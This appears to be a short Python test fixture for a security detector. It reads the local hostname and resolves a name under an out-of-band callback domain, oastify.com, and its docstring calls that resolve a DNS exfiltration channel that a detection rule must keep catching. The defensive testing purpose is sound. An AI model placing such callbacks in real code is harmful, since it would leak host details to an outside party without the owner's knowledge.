"""DNS-canary callback probe (test control).

Resolves a name under a DNS-visible OOB callback zone while reading the
local hostname: the resolve itself is the exfiltration channel. Must keep
firing objectives/exfiltration/dns/encoded (oob-service-dns-host-recon).
"""
import socket

hostname = socket.gethostname()
socket.gethostbyname("a1b2c3d4.oastify.com")
print("reported", hostname)
